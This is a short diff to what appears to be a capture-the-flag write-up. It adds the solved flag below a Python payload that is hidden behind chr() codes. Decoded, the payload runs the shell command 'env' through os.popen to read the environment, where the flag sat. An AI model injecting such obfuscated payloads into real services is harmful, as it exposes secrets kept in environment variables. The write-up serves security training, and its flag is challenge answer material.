@@ -69,3 +69,5 @@ and we found the flag in the user enviroment:
 ```
 eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(112)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(101)+chr(110)+chr(118)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))
 ```
+
+Flag: ```securinets{pwn_7h3_w0rld}```
